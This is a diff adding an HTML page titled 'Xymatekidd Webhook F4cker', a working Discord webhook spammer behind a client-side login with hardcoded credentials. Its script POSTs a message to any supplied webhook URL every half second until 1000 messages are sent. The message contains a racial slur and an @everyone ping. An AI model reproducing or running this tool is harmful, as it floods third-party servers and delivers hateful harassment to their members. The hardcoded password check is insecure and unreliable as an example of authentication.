@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xymatekidd Webhook Hacks</title>
+    <style>
+        :root {
+            --main-color: #ff0000;
+            --secondary-color: #000;
+            --accent-color: #990000;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #111;
+            color: white;
+            margin: 0;
+            padding: 0;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(255,0,0,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(255,0,0,0.1) 0%, transparent 50%);
+            height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .title {
+            text-align: center;
+            font-size: 3rem;
+            margin: 30px 0;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            color: var(--main-color);
+            text-shadow: 0 0 10px rgba(255,0,0,0.5), 
+                         0 0 20px rgba(255,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { text-shadow: 0 0 10px rgba(255,0,0,0.5), 0 0 20px rgba(255,0,0,0.3); }
+            50% { text-shadow: 0 0 15px rgba(255,0,0,0.7), 0 0 30px rgba(255,0,0,0.5); }
+            100% { text-shadow: 0 0 10px rgba(255,0,0,0.5), 0 0 20px rgba(255,0,0,0.3); }
+        }
+        
+        .login-box {
+            background-color: rgba(0,0,0,0.7);
+            border: 1px solid var(--main-color);
+            border-radius: 5px;
+            padding: 30px;
+            width: 300px;
+            margin: 0 auto;
+            box-shadow: 0 0 20px rgba(255,0,0,0.2);
+        }
+        
+        .login-box h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--main-color);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ccc;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            background-color: #222;
+            border: 1px solid #444;
+            border-radius: 3px;
+            color: white;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--main-color);
+        }
+        
+        button {
+            background-color: var(--main-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            width: 100%;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background-color: var(--accent-color);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255,0,0,0.3);
+        }
+        
+        .webhook-box {
+            background-color: rgba(0,0,0,0.8);
+            border: 1px solid var(--main-color);
+            border-radius: 5px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .webhook-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            background-color: #222;
+            border: 1px solid #444;
+            border-radius: 3px;
+            color: white;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #222;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .counter {
+            color: var(--main-color);
+            font-weight: bold;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .glitch {
+            position: relative;
+        }
+        
+        .glitch::before, .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .glitch::before {
+            left: 2px;
+            text-shadow: -2px 0 red;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim 5s infinite linear alternate-reverse;
+        }
+        
+        .glitch::after {
+            left: -2px;
+            text-shadow: -2px 0 blue;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim2 5s infinite linear alternate-reverse;
+        }
+        
+        @keyframes glitch-anim {
+            0% { clip: rect(31px, 9999px, 94px, 0); }
+            10% { clip: rect(112px, 9999px, 76px, 0); }
+            20% { clip: rect(85px, 9999px, 77px, 0); }
+            30% { clip: rect(27px, 9999px, 97px, 0); }
+            40% { clip: rect(64px, 9999px, 98px, 0); }
+            50% { clip: rect(61px, 9999px, 85px, 0); }
+            60% { clip: rect(99px, 9999px, 114px, 0); }
+            70% { clip: rect(34px, 9999px, 115px, 0); }
+            80% { clip: rect(98px, 9999px, 129px, 0); }
+            90% { clip: rect(43px, 9999px, 96px, 0); }
+            100% { clip: rect(82px, 9999px, 64px, 0); }
+        }
+        
+        @keyframes glitch-anim2 {
+            0% { clip: rect(65px, 9999px, 119px, 0); }
+            10% { clip: rect(25px, 9999px, 145px, 0); }
+            20% { clip: rect(50px, 9999px, 118px, 0); }
+            30% { clip: rect(79px, 9999px, 133px, 0); }
+            40% { clip: rect(100px, 9999px, 80px, 0); }
+            50% { clip: rect(15px, 9999px, 66px, 0); }
+            60% { clip: rect(115px, 9999px, 113px, 0); }
+            70% { clip: rect(20px, 9999px, 20px, 0); }
+            80% { clip: rect(80px, 9999px, 80px, 0); }
+            90% { clip: rect(70px, 9999px, 100px, 0); }
+            100% { clip: rect(30px, 9999px, 130px, 0); }
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--main-color);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            z-index: 1000;
+            animation: slideIn 0.5s forwards;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div id="login-page">
+        <div class="container">
+            <h1 class="title glitch" data-text="Xymatekidd Webhook Hacks😈😈😈">Xymatekidd Webhook Hacks😈😈😈</h1>
+            
+            <div class="login-box">
+                <h2>Login</h2>
+                <form id="login-form">
+                    <div class="input-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" required>
+                    </div>
+                    
+                    <button type="submit">Login</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <div id="main-page" class="hidden">
+        <div class="container">
+            <h1 class="title glitch" data-text="Xymatekidd Webhook F4cker V5.1">Xymatekidd Webhook F4cker V5.1</h1>
+            
+            <div class="webhook-box">
+                <input type="text" id="webhook-url" class="webhook-input" placeholder="Enter Discord Webhook URL">
+                <button id="start-spam">START F4CKING</button>
+                <button id="stop-spam" class="hidden">STOP SPAM</button>
+                
+                <div class="status">
+                    <p>Status: <span id="status-text">Ready</span></p>
+                    <p>Messages sent: <span id="counter" class="counter">0</span>/1000+</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Login functionality
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if(username === 'Xymatekidd' && password === 'Xymatekiddontop') {
+                document.getElementById('login-page').classList.add('hidden');
+                document.getElementById('main-page').classList.remove('hidden');
+            } else {
+                alert('Invalid credentials!');
+            }
+        });
+        
+        // Webhook spammer
+        let spamInterval;
+        let messageCount = 0;
+        const spamMessage = "YALL GOT FUCKED BY XYMATEKIDD NIGGERSSS @everyone";
+        
+        document.getElementById('start-spam').addEventListener('click', function() {
+            const webhookUrl = document.getElementById('webhook-url').value;
+            
+            if (!webhookUrl) {
+                alert('Please enter a webhook URL!');
+                return;
+            }
+            
+            // Show notification
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.textContent = 'SEND 1000+ MESSAGE FROM THE SERVER';
+            document.body.appendChild(notification);
+            
+            // Remove notification after 3 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+            
+            // Start spamming
+            document.getElementById('start-spam').classList.add('hidden');
+            document.getElementById('stop-spam').classList.remove('hidden');
+            document.getElementById('status-text').textContent = 'Spamming...';
+            
+            spamInterval = setInterval(() => {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: spamMessage
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        messageCount++;
+                        document.getElementById('counter').textContent = messageCount;
+                        
+                        if (messageCount >= 1000) {
+                            document.getElementById('status-text').textContent = 'Done successfully sent 1000+ messages';
+                            clearInterval(spamInterval);
+                            document.getElementById('start-spam').classList.remove('hidden');
+                            document.getElementById('stop-spam').classList.add('hidden');
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('status-text').textContent = 'Error sending message';
+                });
+            }, 500); // 0.5 second delay between messages
+        });
+        
+        document.getElementById('stop-spam').addEventListener('click', function() {
+            clearInterval(spamInterval);
+            document.getElementById('status-text').textContent = 'Stopped manually';
+            document.getElementById('start-spam').classList.remove('hidden');
+            document.getElementById('stop-spam').classList.add('hidden');
+        });
+    </script>
+</body>
+</html>
